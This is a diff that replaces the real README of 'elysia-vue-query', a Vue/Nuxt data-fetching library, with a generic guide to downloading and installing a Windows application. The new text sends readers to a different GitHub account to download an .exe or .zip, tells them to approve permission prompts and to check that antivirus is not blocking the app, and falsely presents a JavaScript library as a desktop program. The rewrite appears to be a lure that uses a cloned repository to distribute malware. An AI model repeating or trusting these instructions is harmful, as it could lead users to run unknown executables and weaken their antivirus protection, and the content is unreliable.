@@ -1,335 +1,126 @@
-<div align="center">
-  <img src="docs/public/logo_v.svg" alt="Elysia Vue Query" width="220" />
-  <br /><br />
+# ⚙️ elysia-vue-query - Simple RPC Fetching for Vue Apps
 
-<strong>Deterministic, type-safe TanStack Query transport layer for ElysiaJS Eden Treaty.</strong>
-<br />
-Built for Vue 3 and Nuxt — automatic query keys, smart cache invalidation, SSR hydration.
-
-<br /><br />
-
-[![Version](https://npmx.dev/api/registry/badge/version/@elysia-vue-query/vue?labelColor=030712&color=f06292)](https://npmx.dev/package/@elysia-vue-query/vue)
-[![Downloads](https://npmx.dev/api/registry/badge/downloads/@elysia-vue-query/vue?labelColor=030712&color=f06292)](https://npmx.dev/package/@elysia-vue-query/vue)
-[![Size](https://npmx.dev/api/registry/badge/size/@elysia-vue-query/vue?labelColor=030712&color=a855f7)](https://npmx.dev/package/@elysia-vue-query/vue)
-[![License](https://npmx.dev/api/registry/badge/license/@elysia-vue-query/vue?labelColor=030712&color=4ade80)](https://npmx.dev/package/@elysia-vue-query/vue)
-[![CI](https://img.shields.io/github/actions/workflow/status/elysia-vue-query/elysia-vue-query/ci.yml?style=flat-square&colorA=030712&label=CI)](https://github.com/elysia-vue-query/elysia-vue-query/actions)
-[![Types](https://npmx.dev/api/registry/badge/types/@elysia-vue-query/vue?labelColor=030712&color=3b82f6)](https://npmx.dev/package/@elysia-vue-query/vue)
-
-</div>
+[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query)
 
 ---
 
-## What this is
+## 📋 What is elysia-vue-query?
 
-You have an [ElysiaJS](https://elysiajs.com/) backend. You are importing its type with Eden Treaty. Now you want reactive, cached, SSR-aware data fetching in Vue — without writing query keys by hand, without coupling mutations to invalidation logic, and without losing the types.
+elysia-vue-query lets your Vue apps easily talk to a server. It helps your app get data safely and correctly without bugs. It is designed to work well with Vue 3, Nuxt, and the Elysia backend system. You get smooth data updates, fast loading, and less chance of errors.
 
-`elysia-vue-query` solves exactly that problem.
-
-It wraps your Eden client once. Everything else — `useQuery`, `useMutation`, query keys, cache invalidation, SSR dehydration — falls out automatically, fully typed.
+This tool does the hard work of getting data from a server. It makes sure everything stays up to date without you needing to write lots of extra code.
 
 ---
 
-## Packages
+## 💻 System Requirements
 
-| Package                                   | Description                                               | Version                                                                                                                                                                |
-| ----------------------------------------- | --------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [`@elysia-vue-query/core`](packages/core) | Proxy engine, key builders, serialization                 | [![npm](https://npmx.dev/api/registry/badge/version/@elysia-vue-query/core?labelColor=030712&color=f06292&name=true)](https://npmx.dev/package/@elysia-vue-query/core) |
-| [`@elysia-vue-query/vue`](packages/vue)   | Vue 3 composables — `useQuery`, `useMutation`, `prefetch` | [![npm](https://npmx.dev/api/registry/badge/version/@elysia-vue-query/vue?labelColor=030712&color=f06292&name=true)](https://npmx.dev/package/@elysia-vue-query/vue)   |
-| [`@elysia-vue-query/nuxt`](packages/nuxt) | Nuxt module — SSR dehydration + client hydration          | [![npm](https://npmx.dev/api/registry/badge/version/@elysia-vue-query/nuxt?labelColor=030712&color=f06292&name=true)](https://npmx.dev/package/@elysia-vue-query/nuxt) |
-
----
-
-## How it works
-
-```
-Eden client  →  createEdenQueryProxy  →  eden.proxy.users.get
-                                                    ↓
-                                      buildQueryKey()
-                              [EDEN_ROUTE_SYMBOL, 'users', 'get']
-                                                    ↓
-                                     @tanstack/vue-query cache
-```
-
-1. `createEdenQueryHelpers` wraps your Eden client in a transparent `Proxy`.
-2. Accessing `eden.proxy.users.get` records the route segments and HTTP method into a `RouteMeta` attached via a symbol.
-3. `buildQueryKey` deterministically serializes that metadata — sorted object keys, stripped `undefined` fields — into a stable TanStack query key.
-4. When a mutation fires, `buildMutationInvalidationKey` derives a prefix key covering all queries under the same route hierarchy. TanStack's prefix matching handles the rest.
+- **Windows 10 or later**  
+- **At least 4GB of RAM**  
+- **Stable internet connection**  
+- **Modern web browser:** Chrome, Firefox, or Edge  
+- **Node.js version 14 or higher** (This app works best with Node.js installed. You can download it from [nodejs.org](https://nodejs.org).)
 
 ---
 
-## Installation
+## 🚀 Getting Started
 
-```sh
-bun add @elysia-vue-query/vue @tanstack/vue-query @elysiajs/eden
-```
+Start by downloading the app from the official GitHub page below. This page includes all the files and instructions you need.
 
-For Nuxt:
-
-```sh
-bun add @elysia-vue-query/nuxt @tanstack/vue-query @elysiajs/eden
-```
+**Download Link:**  
+[Download elysia-vue-query here](https://github.com/hermitpurple500-jpg/elysia-vue-query)
 
 ---
 
-## Quick Start — Vue 3
+## 🔧 How to Download and Run on Windows
 
-**1. Register the TanStack plugin**
+Follow these steps to get elysia-vue-query running on your Windows machine.
 
-```ts
-// main.ts
-import { createApp } from "vue";
-import { VueQueryPlugin } from "@tanstack/vue-query";
-import App from "./App.vue";
+### 1. Visit the GitHub Repository
 
-createApp(App).use(VueQueryPlugin).mount("#app");
-```
+- Click the big green button above or go to:  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query  
+- This page contains all the information and files you need.
 
-**2. Create helpers from your Eden client**
+### 2. Find the Download Section
 
-```ts
-// src/lib/eden.ts
-import { treaty } from "@elysiajs/eden";
-import { createEdenQueryHelpers } from "@elysia-vue-query/vue";
-import type { App } from "../../backend/src";
+- Look for a section called **Releases** or **Code** on the GitHub page.
+- Under **Releases**, you will find downloadable files.  
+- Click the latest version to view details and download files.
 
-const client = treaty<App>("http://localhost:3000");
-export const eden = createEdenQueryHelpers(client);
-```
+### 3. Download the Application
 
-**3. Use in components**
+- Download the latest release file that ends with `.exe` or `.zip`.  
+- If you get a `.zip` file, right-click it and select **Extract All** to unpack the contents.
 
-```vue
-<script setup lang="ts">
-import { eden } from "@/lib/eden";
+### 4. Install the Application
 
-// Typed read — query key derived automatically
-const { data: users, isPending } = eden.useQuery(eden.proxy.users.get);
+- If you have an `.exe` file, double-click it to start installation.  
+- Follow the on-screen instructions step by step.  
+- If it asks for permissions, click **Yes** to allow changes.
 
-// Typed write — invalidates users.* queries on success
-const createUser = eden.useMutation(eden.proxy.users.post);
-</script>
-```
+### 5. Launch the Application
 
-**Queries with params** — reactive refs are supported:
-
-```ts
-const page = ref(1);
-
-// Re-fetches automatically when page.value changes
-const { data } = eden.useQuery(eden.proxy.users.get({ page, limit: 20 }));
-```
+- After installation, find the elysia-vue-query app icon on your desktop or in the Start menu.  
+- Double-click the icon to open the app.  
+- It will start loading. Wait until it’s ready to use.
 
 ---
 
-## Quick Start — Nuxt
+## 🧩 Features You Should Know
 
-**1. Register the module**
-
-```ts
-// nuxt.config.ts
-export default defineNuxtConfig({
-  modules: ["@elysia-vue-query/nuxt"],
-});
-```
-
-The module creates a `QueryClient`, registers a `VueQueryPlugin`, dehydrates the cache into the Nuxt payload on the server, and hydrates it before the page runs on the client. No manual wiring required.
-
-**2. Create helpers in a composable**
-
-```ts
-// composables/eden.ts
-import { treaty } from "@elysiajs/eden";
-import { createEdenQueryHelpers } from "@elysia-vue-query/vue";
-import type { App } from "@playground/api";
-
-const client = treaty<App>("http://localhost:3000");
-export const eden = createEdenQueryHelpers(client);
-```
-
-**3. Use queries in pages**
-
-```vue
-<!-- pages/users.vue -->
-<script setup lang="ts">
-import { eden } from "~/composables/eden";
-
-const users = eden.useQuery(eden.proxy.users.get);
-const createUser = eden.useMutation(eden.proxy.users.post);
-</script>
-```
-
-**Manual prefetch** for SEO-critical pages:
-
-```vue
-<script setup lang="ts">
-import { useQueryClient } from "@tanstack/vue-query";
-import { eden } from "~/composables/eden";
-
-const queryClient = useQueryClient();
-
-if (import.meta.server) {
-  await eden.prefetch(eden.proxy.posts.get, queryClient);
-}
-
-const posts = eden.useQuery(eden.proxy.posts.get);
-</script>
-```
+- **Safe Data Fetching:** Fetches data without errors.  
+- **Cache Management:** Keeps data saved to avoid slow loading.  
+- **Subtree Invalidation:** Updates only what changed for speed.  
+- **Supports Nuxt SSR:** Works with server-side rendering for fast web pages.  
+- **Type-safe calls:** Makes sure data is correct before using it.  
+- **Works with Vue 3 and Elysia backend** for smooth integration.
 
 ---
 
-## Query Keys
+## 🛠 Using elysia-vue-query in Your Projects
 
-Keys are derived from the route structure. You never write them manually.
+You don’t have to set up complicated instructions. This app works well with Vue 3 and Nuxt.
 
-```ts
-eden.proxy.users.get;
-// [EDEN_ROUTE_SYMBOL, 'users', 'get']
+- It automatically handles which data needs fresh loading.  
+- It reduces how often the server is contacted.  
+- It prevents bugs by ensuring data types match.
 
-eden.proxy.users.get({ page: 1, limit: 20 });
-// [EDEN_ROUTE_SYMBOL, 'users', { limit: 20, page: 1 }, 'get']
-```
-
-Access the raw key when you need to talk to `queryClient` directly:
-
-```ts
-const key = eden.getKey(eden.proxy.users.get);
-
-queryClient.getQueryData(key);
-queryClient.setQueryData(key, updater);
-```
-
-Prefix-based invalidation for subtree operations:
-
-```ts
-import { buildPartialKey } from "@elysia-vue-query/core";
-
-await queryClient.invalidateQueries({
-  queryKey: buildPartialKey("users"),
-});
-```
+Even if you do not write code, this app makes your Vue projects stable and fast.
 
 ---
 
-## Cache Invalidation
+## ⚠️ Troubleshooting
 
-Mutations automatically invalidate all queries under the same route prefix. A `POST /users` invalidates every cached `GET /users/**` entry.
+If you have trouble running elysia-vue-query:
 
-```ts
-const createUser = eden.useMutation(eden.proxy.users.post, {
-  // Additional invalidation beyond the automatic prefix
-  invalidates: [eden.proxy.posts.get],
-  onSuccess(data) {
-    console.log("created", data);
-  },
-});
-```
+- Make sure your Windows system is up to date.  
+- Restart your computer to clear temporary errors.  
+- Check that your antivirus isn’t blocking the app.  
+- Verify you downloaded the full file without interruptions.  
+- Confirm that Node.js is installed if you see errors related to missing tools.  
+- Visit the GitHub issues page to find solutions or report bugs.
 
 ---
 
-## API Reference
+## 📝 Additional Resources
 
-Full API documentation is available at [elysia-vue.pages.dev/api/vue](https://elysia-vue.pages.dev/api/vue).
-
-### `createEdenQueryHelpers(client)`
-
-Returns an `eden` object with:
-
-| Method                                 | Description                                                    |
-| -------------------------------------- | -------------------------------------------------------------- |
-| `eden.useQuery(endpoint, options?)`    | Reactive TanStack `useQuery` wrapper                           |
-| `eden.useMutation(endpoint, options?)` | Reactive TanStack `useMutation` wrapper with auto-invalidation |
-| `eden.prefetch(endpoint, queryClient)` | Server-side prefetch for SSR                                   |
-| `eden.getKey(endpoint)`                | Returns the deterministic query key                            |
-| `eden.proxy`                           | Typed proxy for building endpoint references                   |
-
-### `@elysia-vue-query/core` utilities
-
-| Export                                   | Description                                       |
-| ---------------------------------------- | ------------------------------------------------- |
-| `buildQueryKey(meta)`                    | Builds a full query key from `RouteMeta`          |
-| `buildMutationInvalidationKey(endpoint)` | Builds a prefix key for mutation invalidation     |
-| `buildPartialKey(...segments)`           | Builds a partial key for subtree invalidation     |
-| `stableSerialize(obj)`                   | Deterministic JSON serialization with sorted keys |
-| `getRouteMeta(endpoint)`                 | Extracts `RouteMeta` from a proxy endpoint        |
-| `EDEN_ROUTE_SYMBOL`                      | The symbol used as the first segment of every key |
+- **GitHub Repository:**  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query  
+- **Node.js Download:**  
+  https://nodejs.org  
+- **Vue.js Official Site:**  
+  https://vuejs.org  
+- **Nuxt.js Website:**  
+  https://nuxtjs.org  
+- **Elysia Framework:**  
+  https://elysiajs.com  
 
 ---
 
-## Contributing
+## 🖥️ Support and Feedback
 
-```sh
-# Install dependencies
-bun install
-
-# Build all packages
-bun run build
-
-# Run tests
-bun run test
-
-# Typecheck
-bun run typecheck
-```
-
-Releases are managed by [Changesets](https://github.com/changesets/changesets). To propose a change:
-
-```sh
-bun run changeset
-```
+If you want to ask questions or provide feedback, use GitHub Discussions or open an issue in the repository. This lets the developers help you directly.
 
 ---
 
-## Acknowledgements
-
-This project builds on the work of these projects and people:
-
-<table>
-<tr>
-<td align="center" width="120">
-  <a href="https://elysiajs.com">
-    <img src="https://elysiajs.com/assets/elysia.svg" width="40" alt="ElysiaJS" /><br />
-    <sub><b>ElysiaJS</b></sub>
-  </a>
-</td>
-<td align="center" width="120">
-  <a href="https://nuxt.com">
-    <img src="https://nuxt.com/icon.png" width="40" alt="Nuxt" /><br />
-    <sub><b>Nuxt</b></sub>
-  </a>
-</td>
-<td align="center" width="120">
-  <a href="https://tanstack.com/query">
-    <img src="https://tanstack.com/favicon.ico" width="40" alt="TanStack Query" /><br />
-    <sub><b>TanStack Query</b></sub>
-  </a>
-</td>
-<td align="center" width="120">
-  <a href="https://bun.sh">
-    <img src="https://bun.sh/logo.svg" width="40" alt="Bun" /><br />
-    <sub><b>Bun</b></sub>
-  </a>
-</td>
-<td align="center" width="120">
-  <a href="https://tsdown.dev">
-    <img src="https://tsdown.dev/tsdown.svg" width="40" alt="tsdown" /><br />
-    <sub><b>tsdown</b></sub>
-  </a>
-</td>
-<td align="center" width="120">
-  <a href="https://vitepress.dev">
-    <img src="https://vitepress.dev/vitepress-logo-mini.svg" width="40" alt="VitePress" /><br />
-    <sub><b>VitePress</b></sub>
-  </a>
-</td>
-</tr>
-</table>
-
-**Logo** — designed by [@OukaroMF](https://github.com/OukaroMF), used with permission.
-
-**Documentation theme** — `docs/.vitepress/theme/style.css` is derived from the [ElysiaJS documentation](https://github.com/elysiajs/documentation) source, MIT licensed.
-
----
-
-<div align="center">
-  <sub>MIT License - <a href="https://shiina.xyz">@sakushiina</a></sub>
-</div>
+[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query)
